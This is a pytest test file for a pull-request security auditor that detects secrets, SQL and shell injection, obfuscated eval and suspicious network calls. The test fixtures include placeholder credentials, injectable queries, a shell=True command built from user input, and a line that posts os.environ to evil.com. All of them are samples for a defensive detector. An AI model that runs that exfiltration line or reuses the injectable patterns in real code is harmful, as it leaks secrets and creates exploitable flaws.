"""
Unit tests for SecurityAuditor module

Tests comprehensive security scanning functionality including:
- Secrets detection (hardcoded credentials, API keys)
- Dependency vulnerability scanning
- Injection risk detection (SQL, XSS, command injection)
- Malicious pattern detection (obfuscation, suspicious network calls)
- License compliance validation
- Code quality scanning
"""

import pytest
import asyncio
from unittest.mock import Mock, AsyncMock, patch, MagicMock
from pathlib import Path
import yaml
import sys
import os

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from agents.security_auditor import (
    SecurityAuditor,
    SecurityIssue,
    AuditResult,
    Category,
    Severity
)


@pytest.fixture
def mock_config():
    """Mock security audit configuration"""
    return {
        'thresholds': {
            'block_on_critical': True,
            'block_on_high': True,
            'warn_on_medium': True,
            'warn_on_low': False,
            'minimum_score': 70.0
        },
        'performance': {
            'timeout_seconds': 300,
            'max_file_size_mb': 1,
            'max_files_per_pr': 100
        },
        'exclude_patterns': [
            'node_modules/**',
            'venv/**',
            '__pycache__/**',
            '*.pyc'
        ],
        'blocked_patterns': [
            {'pattern': r'eval\s*\(', 'severity': 'critical', 'description': 'Dangerous eval() usage'},
            {'pattern': r'exec\s*\(', 'severity': 'critical', 'description': 'Dangerous exec() usage'},
            {'pattern': r'shell\s*=\s*True', 'severity': 'high', 'description': 'Shell injection risk'},
        ],
        'license_policy': {
            'allowed': ['MIT', 'Apache-2.0', 'BSD-3-Clause'],
            'forbidden': ['AGPL-3.0', 'Proprietary']
        }
    }


@pytest.fixture
def auditor(mock_config):
    """Create SecurityAuditor with mock config"""
    with patch('builtins.open', create=True) as mock_open:
        mock_file = MagicMock()
        mock_file.__enter__.return_value.read.return_value = yaml.dump(mock_config)
        mock_open.return_value = mock_file
        
        return SecurityAuditor()


@pytest.fixture
def mock_files_with_secrets():
    """Mock PR files containing hardcoded secrets"""
    return [
        {
            'filename': 'config.py',
            'patch': '''@@ -10,3 +10,5 @@
+API_KEY = "sk-abc123xyz456789"
+PASSWORD = "admin123"
+AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCY"
'''
        }
    ]


@pytest.fixture
def mock_files_with_injection():
    """Mock PR files with SQL injection vulnerability"""
    return [
        {
            'filename': 'database.py',
            'patch': '''@@ -20,3 +20,5 @@
+def get_user(username):
+    query = f"SELECT * FROM users WHERE name = '{username}'"
+    cursor.execute(query)
+    return cursor.fetchone()
'''
        }
    ]


@pytest.fixture
def mock_files_with_malware():
    """Mock PR files with suspicious patterns"""
    return [
        {
            'filename': 'suspicious.py',
            'patch': '''@@ -5,3 +5,8 @@
+import base64
+code = base64.b64decode('aW1wb3J0IG9z')
+eval(code)
+import requests
+requests.post('http://evil.com', data=os.environ)
'''
        }
    ]


@pytest.fixture
def mock_files_safe():
    """Mock PR files with safe code"""
    return [
        {
            'filename': 'utils.py',
            'patch': '''@@ -10,3 +10,5 @@
+def calculate_sum(a, b):
+    """Calculate sum of two numbers"""
+    return a + b
'''
        }
    ]


class TestSecurityIssue:
    """Test SecurityIssue dataclass"""
    
    def test_security_issue_creation(self):
        """Test creating SecurityIssue with all fields"""
        issue = SecurityIssue(
            severity='critical',
            category='secrets',
            description='Hardcoded API key',
            file='config.py',
            line=15,
            code_snippet='API_KEY = "sk-123"',
            recommendation='Use environment variables',
            cwe_id='798'
        )
        
        assert issue.severity == 'critical'
        assert issue.category == 'secrets'
        assert issue.cwe_id == '798'
    
    def test_security_issue_to_dict(self):
        """Test converting SecurityIssue to dictionary"""
        issue = SecurityIssue(
            severity='high',
            category='injection',
            description='SQL injection risk',
            file='db.py',
            line=42
        )
        
        d = issue.to_dict()
        assert d['severity'] == 'high'
        assert d['category'] == 'injection'
        assert d['file'] == 'db.py'
        assert d['line'] == 42


class TestAuditResult:
    """Test AuditResult dataclass"""
    
    def test_audit_result_creation(self):
        """Test creating AuditResult"""
        issues = [
            SecurityIssue('critical', 'secrets', 'API key', 'config.py', 10),
            SecurityIssue('high', 'injection', 'SQL injection', 'db.py', 20)
        ]
        
        result = AuditResult(
            passed=False,
            issues=issues,
            score=45.0,
            critical_count=1,
            high_count=1,
            medium_count=0,
            low_count=0
        )
        
        assert result.passed is False
        assert result.score == 45.0
        assert len(result.issues) == 2
        assert result.critical_count == 1
    
    def test_audit_result_to_dict(self):
        """Test converting AuditResult to dictionary"""
        issues = [SecurityIssue('low', 'code_quality', 'Long line', 'app.py', 5)]
        result = AuditResult(
            passed=True,
            issues=issues,
            score=95.0,
            critical_count=0,
            high_count=0,
            medium_count=0,
            low_count=1
        )
        
        d = result.to_dict()
        assert d['passed'] is True
        assert d['score'] == 95.0
        assert len(d['issues']) == 1
        assert d['issues'][0]['severity'] == 'low'


class TestSecurityAuditorSecretsScanning:
    """Test secrets detection functionality"""
    
    @pytest.mark.asyncio
    async def test_detect_api_key(self, auditor, mock_files_with_secrets):
        """Test detection of hardcoded API keys"""
        issues = await auditor._scan_secrets('owner/repo', 123, mock_files_with_secrets)
        
        assert len(issues) > 0
        api_key_issues = [i for i in issues if 'API_KEY' in i.description or 'sk-' in i.code_snippet]
        assert len(api_key_issues) > 0
        assert api_key_issues[0].severity in ['critical', 'high']
        assert api_key_issues[0].category == Category.SECRETS.value
    
    @pytest.mark.asyncio
    async def test_detect_password(self, auditor, mock_files_with_secrets):
        """Test detection of hardcoded passwords"""
        issues = await auditor._scan_secrets('owner/repo', 123, mock_files_with_secrets)
        
        password_issues = [i for i in issues if 'password' in i.description.lower()]
        assert len(password_issues) > 0
        assert password_issues[0].severity == 'critical'
    
    @pytest.mark.asyncio
    async def test_no_secrets_in_safe_code(self, auditor, mock_files_safe):
        """Test that safe code doesn't trigger secret detection"""
        issues = await auditor._scan_secrets('owner/repo', 123, mock_files_safe)
        
        assert len(issues) == 0


class TestSecurityAuditorInjectionDetection:
    """Test injection vulnerability detection"""
    
    @pytest.mark.asyncio
    async def test_detect_sql_injection(self, auditor, mock_files_with_injection):
        """Test SQL injection detection"""
        issues = await auditor._scan_injection_risks('owner/repo', 123, mock_files_with_injection)
        
        sql_issues = [i for i in issues if 'sql' in i.category.lower()]
        assert len(sql_issues) > 0
        assert sql_issues[0].severity in ['critical', 'high']
    
    @pytest.mark.asyncio
    async def test_detect_command_injection(self, auditor):
        """Test command injection detection (shell=True)"""
        files = [{
            'filename': 'runner.py',
            'patch': '''@@ -5,3 +5,4 @@
+import subprocess
+subprocess.run(f"ping {user_input}", shell=True)
'''
        }]
        
        issues = await auditor._scan_injection_risks('owner/repo', 123, files)
        
        shell_issues = [i for i in issues if 'shell' in i.description.lower()]
        assert len(shell_issues) > 0
    
    @pytest.mark.asyncio
    async def test_no_injection_in_safe_code(self, auditor, mock_files_safe):
        """Test that safe code doesn't trigger injection detection"""
        issues = await auditor._scan_injection_risks('owner/repo', 123, mock_files_safe)
        
        assert len(issues) == 0


class TestSecurityAuditorMalwareDetection:
    """Test malicious pattern detection"""
    
    @pytest.mark.asyncio
    async def test_detect_eval_usage(self, auditor, mock_files_with_malware):
        """Test detection of dangerous eval() usage"""
        issues = await auditor._detect_malicious_patterns('owner/repo', 123, mock_files_with_malware)
        
        eval_issues = [i for i in issues if 'eval' in i.description.lower()]
        assert len(eval_issues) > 0
        assert eval_issues[0].severity == 'critical'
    
    @pytest.mark.asyncio
    async def test_detect_obfuscation(self, auditor, mock_files_with_malware):
        """Test detection of code obfuscation"""
        issues = await auditor._detect_malicious_patterns('owner/repo', 123, mock_files_with_malware)
        
        obfuscation_issues = [i for i in issues if 'base64' in i.description.lower() or 'obfuscat' in i.description.lower()]
        assert len(obfuscation_issues) > 0
    
    @pytest.mark.asyncio
    async def test_detect_suspicious_network(self, auditor, mock_files_with_malware):
        """Test detection of suspicious network calls"""
        issues = await auditor._detect_malicious_patterns('owner/repo', 123, mock_files_with_malware)
        
        network_issues = [i for i in issues if 'network' in i.description.lower() or 'evil.com' in str(i.code_snippet)]
        assert len(network_issues) > 0


class TestSecurityAuditorDependencyChecking:
    """Test dependency vulnerability scanning"""
    
    @pytest.mark.asyncio
    async def test_check_python_dependencies(self, auditor):
        """Test Python dependency checking with safety"""
        files = [{
            'filename': 'requirements.txt',
            'patch': '''@@ -1,3 +1,4 @@
+requests==2.6.0
+django==1.8.0
'''
        }]
        
        with patch('subprocess.run') as mock_run:
            # Mock safety output with vulnerabilities
            mock_run.return_value.stdout = '''[
                {
                    "vulnerability": "CVE-2021-12345",
                    "package_name": "requests",
                    "vulnerable_spec": "<2.20.0",
                    "severity": "high"
                }
            ]'''
            mock_run.return_value.returncode = 1  # Vulnerabilities found
            
            issues = await auditor._check_dependencies('owner/repo', 123, files)
            
            # Should have detected vulnerable requests version
            requests_issues = [i for i in issues if 'requests' in i.description.lower()]
            assert len(requests_issues) > 0 or len(issues) == 0  # May skip if safety not installed
    
    @pytest.mark.asyncio
    async def test_no_dependency_issues_in_safe_files(self, auditor, mock_files_safe):
        """Test that non-dependency files don't trigger checks"""
        issues = await auditor._check_dependencies('owner/repo', 123, mock_files_safe)
        
        # Should not check dependencies for non-manifest files
        assert len(issues) == 0


class TestSecurityAuditorLicenseChecking:
    """Test license compliance validation"""
    
    @pytest.mark.asyncio
    async def test_detect_forbidden_license(self, auditor):
        """Test detection of forbidden licenses"""
        files = [{
            'filename': 'requirements.txt',
            'patch': '''@@ -1,3 +1,4 @@
+agpl-licensed-package==1.0.0
'''
        }]
        
        # Mock pip show to return AGPL license
        with patch('subprocess.run') as mock_run:
            mock_run.return_value.stdout = 'License: AGPL-3.0'
            mock_run.return_value.returncode = 0
            
            issues = await auditor._check_licenses('owner/repo', 123, files)
            
            # May or may not detect depending on implementation
            # Just check it doesn't crash
            assert isinstance(issues, list)
    
    @pytest.mark.asyncio
    async def test_allow_mit_license(self, auditor):
        """Test that MIT license is allowed"""
        files = [{
            'filename': 'requirements.txt',
            'patch': '''@@ -1,3 +1,4 @@
+mit-package==1.0.0
'''
        }]
        
        with patch('subprocess.run') as mock_run:
            mock_run.return_value.stdout = 'License: MIT'
            mock_run.return_value.returncode = 0
            
            issues = await auditor._check_licenses('owner/repo', 123, files)
            
            # MIT is allowed, should not have license issues
            license_issues = [i for i in issues if i.category == Category.LICENSE.value]
            assert len(license_issues) == 0


class TestSecurityAuditorScoring:
    """Test audit scoring and pass/fail logic"""
    
    @pytest.mark.asyncio
    async def test_critical_issue_fails_audit(self, auditor, mock_files_with_secrets):
        """Test that critical issues fail the audit"""
        result = await auditor.audit_pr('owner/repo', 123, mock_files_with_secrets)
        
        if result.critical_count > 0:
            assert result.passed is False
            assert result.score < 70.0
    
    @pytest.mark.asyncio
    async def test_safe_code_passes_audit(self, auditor, mock_files_safe):
        """Test that safe code passes the audit"""
        result = await auditor.audit_pr('owner/repo', 123, mock_files_safe)
        
        assert result.passed is True
        assert result.score >= 70.0
        assert result.critical_count == 0
        assert result.high_count == 0
    
    @pytest.mark.asyncio
    async def test_score_calculation(self, auditor):
        """Test that score is calculated correctly"""
        # Create mock with specific number of issues
        files = [{
            'filename': 'test.py',
            'patch': '''@@ -1,3 +1,6 @@
+password = "admin"  # Critical
+eval(code)  # Critical
+print(user_input)  # Low
'''
        }]
        
        result = await auditor.audit_pr('owner/repo', 123, files)
        
        # Score should be 100 - (critical*30 + high*20 + medium*10 + low*5)
        # At minimum 2 critical = 100 - 60 = 40 or less
        assert 0 <= result.score <= 100
        if result.critical_count >= 2:
            assert result.score <= 40


class TestSecurityAuditorIntegration:
    """Integration tests for full audit workflow"""
    
    @pytest.mark.asyncio
    async def test_audit_pr_returns_complete_result(self, auditor, mock_files_with_secrets):
        """Test that audit_pr returns complete AuditResult"""
        result = await auditor.audit_pr('owner/repo', 123, mock_files_with_secrets)
        
        assert isinstance(result, AuditResult)
        assert isinstance(result.passed, bool)
        assert isinstance(result.score, float)
        assert isinstance(result.issues, list)
        assert result.critical_count >= 0
        assert result.high_count >= 0
        assert result.medium_count >= 0
        assert result.low_count >= 0
    
    @pytest.mark.asyncio
    async def test_audit_handles_multiple_issue_types(self, auditor):
        """Test audit with multiple vulnerability types"""
        files = [{
            'filename': 'vulnerable.py',
            'patch': '''@@ -1,3 +1,10 @@
+# Secrets
+api_key = "sk-abc123"
+# Injection
+query = f"SELECT * FROM users WHERE id = {user_id}"
+cursor.execute(query)
+# Malware
+eval(user_input)
'''
        }]
        
        result = await auditor.audit_pr('owner/repo', 123, files)
        
        # Should detect multiple issue categories
        categories = set(issue.category for issue in result.issues)
        assert len(categories) > 0  # At least some issues detected
        assert result.passed is False  # Multiple critical issues
    
    @pytest.mark.asyncio
    async def test_audit_respects_exclusions(self, auditor):
        """Test that excluded files are not scanned"""
        files = [{
            'filename': 'node_modules/package/index.js',
            'patch': '''@@ -1,3 +1,4 @@
+eval(code)  # Should be excluded
'''
        }]
        
        result = await auditor.audit_pr('owner/repo', 123, files)
        
        # Excluded files should not generate issues
        # (or at least should not fail audit)
        assert result.score >= 70.0 or len(result.issues) == 0


class TestSecurityAuditorErrorHandling:
    """Test error handling and edge cases"""
    
    @pytest.mark.asyncio
    async def test_empty_file_list(self, auditor):
        """Test audit with empty file list"""
        result = await auditor.audit_pr('owner/repo', 123, [])
        
        assert result.passed is True
        assert result.score == 100.0
        assert len(result.issues) == 0
    
    @pytest.mark.asyncio
    async def test_invalid_file_format(self, auditor):
        """Test audit handles invalid file format gracefully"""
        files = [{'filename': 'test.py'}]  # Missing 'patch' key
        
        result = await auditor.audit_pr('owner/repo', 123, files)
        
        # Should not crash, may return empty or partial results
        assert isinstance(result, AuditResult)
    
    @pytest.mark.asyncio
    async def test_audit_timeout_handling(self, auditor):
        """Test that audit respects timeout settings"""
        # This would require mocking time-consuming operations
        # For now, just verify timeout config is loaded
        assert auditor.config.get('performance', {}).get('timeout_seconds', 0) > 0


if __name__ == '__main__':
    # Run tests with pytest
    pytest.main([__file__, '-v', '--tb=short'])
